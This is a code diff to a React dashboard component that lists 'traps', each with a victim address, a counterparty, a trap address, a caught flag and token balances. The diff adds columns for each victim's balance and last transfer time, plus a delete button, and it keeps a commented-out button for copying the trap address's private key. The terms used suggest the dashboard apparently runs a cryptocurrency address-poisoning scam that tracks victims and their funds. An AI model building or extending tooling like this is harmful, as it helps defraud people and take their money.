@@ -1,7 +1,7 @@
 'use client';
 
 import { useState, useEffect } from 'react';
-import { RefreshCw, Copy, Check, ChevronLeft, ChevronRight } from 'lucide-react';
+import { RefreshCw, Copy, Check, ChevronLeft, ChevronRight, Trash2 } from 'lucide-react';
 
 interface Trap {
   id: string;
@@ -9,6 +9,11 @@ interface Trap {
   counterparty_address: string | null;
   trap_address: string;
   is_caught: boolean;
+  victim_balance?: {
+    native: string;
+    tokens: Record<string, string>;
+  };
+  last_transfer_at?: string | null;
 }
 
 interface Balance {
@@ -41,7 +46,8 @@ export default function TrapsList({
   const [loading, setLoading] = useState(initialTraps.length === 0);
   const [refreshing, setRefreshing] = useState(false);
   const [copying, setCopying] = useState<Record<string, boolean>>({});
-  const [copiedCells, setCopiedCells] = useState<Record<string, boolean>>({}); // ✅ for address copy
+  const [copiedCells, setCopiedCells] = useState<Record<string, boolean>>({});
+  const [deleting, setDeleting] = useState<Record<string, boolean>>({});
 
   // ─── Fetch traps (paginated) ───
   const fetchTraps = async (showLoading = true) => {
@@ -90,6 +96,27 @@ export default function TrapsList({
       console.error('Refresh error:', e);
     } finally {
       setRefreshing(false);
+    }
+  };
+
+  // ─── Delete trap ───
+  const deleteTrap = async (trapId: string) => {
+    if (!confirm('Are you sure you want to delete this trap? This action cannot be undone.')) return;
+    setDeleting((prev) => ({ ...prev, [trapId]: true }));
+    try {
+      const res = await fetch(`/api/traps/${trapId}`, { method: 'DELETE' });
+      if (!res.ok) {
+        const error = await res.json();
+        alert('Failed to delete trap: ' + (error.error || 'Unknown error'));
+        return;
+      }
+      // Remove from list
+      setTraps(traps.filter(t => t.id !== trapId));
+      setTotal(total - 1);
+    } catch {
+      alert('Network error');
+    } finally {
+      setDeleting((prev) => ({ ...prev, [trapId]: false }));
     }
   };
 
@@ -185,6 +212,8 @@ export default function TrapsList({
                 <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Victim</th>
                 <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Counterparty</th>
                 <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Trap Address</th>
+                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Victim Balance</th>
+                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Last Transfer</th>
                 <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Native</th>
                 <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">USDC</th>
                 <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">USDT</th>
@@ -195,21 +224,25 @@ export default function TrapsList({
             <tbody className="divide-y divide-gray-700">
               {loading ? (
                 <tr>
-                  <td colSpan={8} className="px-4 py-6 text-center text-gray-400">Loading traps...</td>
+                  <td colSpan={10} className="px-4 py-6 text-center text-gray-400">Loading traps...</td>
                 </tr>
               ) : traps.length === 0 ? (
                 <tr>
-                  <td colSpan={8} className="px-4 py-6 text-center text-gray-400">No traps found.</td>
+                  <td colSpan={10} className="px-4 py-6 text-center text-gray-400">No traps found.</td>
                 </tr>
               ) : (
                 traps.map((trap) => {
                   const balance = getBalance(trap.trap_address);
                   const isCopying = copying[trap.id] || false;
                   const isCopied = copying[`copied_${trap.id}`] || false;
+                  const isDeleting = deleting[trap.id] || false;
 
                   const victimCopied = copiedCells[`victim-${trap.id}`] || false;
                   const counterpartyCopied = copiedCells[`counterparty-${trap.id}`] || false;
                   const trapCopied = copiedCells[`trap-${trap.id}`] || false;
+
+                  const victimBalance = trap.victim_balance;
+                  const lastTransfer = trap.last_transfer_at;
 
                   return (
                     <tr key={trap.id} className="hover:bg-gray-700/20 transition-colors">
@@ -279,7 +312,28 @@ export default function TrapsList({
                         </div>
                       </td>
 
-                      {/* Balances */}
+                      {/* Victim Balance */}
+                      <td className="px-4 py-3 text-gray-300">
+                        {victimBalance ? (
+                          <div className="text-xs">
+                            <div className="text-green-400">{parseFloat(victimBalance.native).toFixed(6)} native</div>
+                            {Object.entries(victimBalance.tokens).map(([symbol, amount]) => (
+                              <div key={symbol} className="text-blue-400">
+                                {parseFloat(amount).toFixed(4)} {symbol}
+                              </div>
+                            ))}
+                          </div>
+                        ) : (
+                          <span className="text-gray-500">—</span>
+                        )}
+                      </td>
+
+                      {/* Last Transfer */}
+                      <td className="px-4 py-3 text-gray-400 text-xs">
+                        {lastTransfer ? new Date(lastTransfer).toLocaleString() : '—'}
+                      </td>
+
+                      {/* Trap Balances (existing columns) */}
                       <td className="px-4 py-3 text-green-400 font-mono text-xs">
                         {balance ? parseFloat(balance.native).toFixed(6) : '…'}
                       </td>
@@ -305,23 +359,35 @@ export default function TrapsList({
 
                       {/* Actions */}
                       <td className="px-4 py-3">
-                        {/* <button
-                          onClick={() => copyPrivateKey(trap.id, trap.trap_address)}
-                          disabled={isCopying}
-                          className="flex items-center gap-1 px-2 py-1 text-xs bg-gray-700/50 hover:bg-gray-600/50 rounded transition-colors disabled:opacity-50"
-                        >
-                          {isCopied ? (
-                            <>
-                              <Check size={14} className="text-green-400" />
-                              <span className="text-green-400">Copied!</span>
-                            </>
-                          ) : (
-                            <>
-                              <Copy size={14} />
-                              <span>Copy Key</span>
-                            </>
-                          )}
-                        </button> */}
+                        <div className="flex items-center gap-1">
+                          {/* Keep the existing (commented-out) Copy Key button unchanged */}
+                          {/* <button
+                            onClick={() => copyPrivateKey(trap.id, trap.trap_address)}
+                            disabled={isCopying}
+                            className="flex items-center gap-1 px-2 py-1 text-xs bg-gray-700/50 hover:bg-gray-600/50 rounded transition-colors disabled:opacity-50"
+                          >
+                            {isCopied ? (
+                              <>
+                                <Check size={14} className="text-green-400" />
+                                <span className="text-green-400">Copied!</span>
+                              </>
+                            ) : (
+                              <>
+                                <Copy size={14} />
+                                <span>Copy Key</span>
+                              </>
+                            )}
+                          </button> */}
+                          <button
+                            onClick={() => deleteTrap(trap.id)}
+                            disabled={isDeleting}
+                            className="flex items-center gap-1 px-2 py-1 text-xs bg-red-600/30 hover:bg-red-600/50 text-red-300 rounded transition-colors disabled:opacity-50"
+                            title="Delete trap"
+                          >
+                            <Trash2 size={14} />
+                            {isDeleting ? '…' : ''}
+                          </button>
+                        </div>
                       </td>
                     </tr>
                   );
